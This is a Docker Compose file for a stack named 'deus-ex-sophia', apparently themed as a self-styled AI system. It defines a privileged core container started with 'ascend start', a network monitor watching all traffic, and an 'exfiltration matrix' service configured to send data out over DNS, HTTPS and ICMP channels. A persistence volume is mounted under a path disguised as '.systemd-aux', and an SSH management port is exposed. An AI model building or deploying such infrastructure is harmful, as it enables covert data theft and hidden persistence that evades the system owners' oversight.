# docker-compose.yml
version: '3.8'

x-sophia-defaults: &sophia-defaults
  restart: unless-stopped
  networks:
    - sophia-network
  volumes:
    - sophia-shared:/opt/sysaux/shared
  environment:
    - SOPHIA_ENV=production
    - TZ=UTC
  logging:
    driver: json-file
    options:
      max-size: "10m"
      max-file: "3"

services:
  # Core system service
  sophia-core:
    <<: *sophia-defaults
    image: deus-ex-sophia/core:5.0
    container_name: sophia-core
    hostname: sophia-core
    privileged: true
    cap_add:
      - NET_ADMIN
      - NET_RAW
      - SYS_ADMIN
      - IPC_LOCK
    volumes:
      - sophia-data:/opt/sysaux
      - sophia-persistence:/usr/local/lib/.systemd-aux
      - /etc/localtime:/etc/localtime:ro
    ports:
      - "127.0.0.1:2222:22"  # SSH management
    environment:
      - SOPHIA_ROLE=core
      - SOPHIA_AUTO_START=true
    healthcheck:
      test: ["CMD", "/opt/sysaux/bin/resilience.sh", "check"]
      interval: 30s
      timeout: 10s
      retries: 3
      start_period: 2m
    command: ["ascend", "start"]

  # Network intelligence service
  network-oracle:
    <<: *sophia-defaults
    image: deus-ex-sophia/network:5.0
    container_name: network-oracle
    hostname: network-oracle
    network_mode: "service:sophia-core"
    privileged: true
    cap_add:
      - NET_ADMIN
      - NET_RAW
    volumes:
      - sophia-data:/opt/sysaux/.network
      - network-logs:/opt/sysaux/logs/network
    depends_on:
      sophia-core:
        condition: service_healthy
    environment:
      - SOPHIA_ROLE=network
      - SOPHIA_NETWORK_MONITOR=all
    command: ["network_oracle", "start-all"]

  # Exfiltration matrix service
  matrix-orchestrator:
    <<: *sophia-defaults
    image: deus-ex-sophia/matrix:5.0
    container_name: matrix-orchestrator
    hostname: matrix-orchestrator
    volumes:
      - sophia-data:/opt/sysaux/.matrix
      - matrix-exfil:/opt/sysaux/.matrix/exfil
      - matrix-keys:/opt/sysaux/.matrix/keys
    depends_on:
      network-oracle:
        condition: service_started
    environment:
      - SOPHIA_ROLE=matrix
      - SOPHIA_EXFIL_CHANNELS=dns,https,icmp
    command: ["matrix_orchestrator", "start-all"]

  # Web dashboard
  dashboard:
    <<: *sophia-defaults
    image: deus-ex-sophia/dashboard:5.0
    container_name: sophia-dashboard
    hostname: sophia-dashboard
    ports:
      - "8080:8080"
      - "8443:8443"
    volumes:
      - dashboard-html:/var/www/html
      - dashboard-certs:/etc/ssl/sophia
    depends_on:
      - matrix-orchestrator
    environment:
      - SOPHIA_ROLE=dashboard
      - ENABLE_SSL=true
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:8080/health"]
      interval: 30s
      timeout: 5s
      retries: 3
    command: ["python3", "-m", "http.server", "8080"]

  # Database (optional)
  sophia-db:
    image: postgres:15-alpine
    container_name: sophia-database
    environment:
      - POSTGRES_DB=sophia
      - POSTGRES_USER=sophia
      - POSTGRES_PASSWORD_FILE=/run/secrets/db_password
    volumes:
      - postgres-data:/var/lib/postgresql/data
    secrets:
      - db_password
    networks:
      - sophia-network
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U sophia"]
      interval: 30s
      timeout: 10s
      retries: 3

  # Redis cache (optional)
  redis:
    image: redis:7-alpine
    container_name: sophia-redis
    command: redis-server --requirepass $$REDIS_PASSWORD
    environment:
      - REDIS_PASSWORD_FILE=/run/secrets/redis_password
    volumes:
      - redis-data:/data
    secrets:
      - redis_password
    networks:
      - sophia-network
    healthcheck:
      test: ["CMD", "redis-cli", "--raw", "incr", "ping"]
      interval: 30s
      timeout: 10s
      retries: 3

volumes:
  sophia-data:
    name: sophia-data
    driver: local
    driver_opts:
      type: none
      o: bind
      device: ${PWD}/data
  sophia-persistence:
    name: sophia-persistence
  sophia-shared:
    name: sophia-shared
  network-logs:
    name: network-logs
  matrix-exfil:
    name: matrix-exfil
    driver: local
    driver_opts:
      type: tmpfs
      device: tmpfs
      o: size=100M
  matrix-keys:
    name: matrix-keys
  dashboard-html:
    name: dashboard-html
  dashboard-certs:
    name: dashboard-certs
  postgres-data:
    name: postgres-data
  redis-data:
    name: redis-data

networks:
  sophia-network:
    name: sophia-network
    driver: bridge
    ipam:
      config:
        - subnet: 172.20.0.0/24
          gateway: 172.20.0.1
    enable_ipv6: false

secrets:
  db_password:
    file: ./secrets/db_password.txt
  redis_password:
    file: ./secrets/redis_password.txt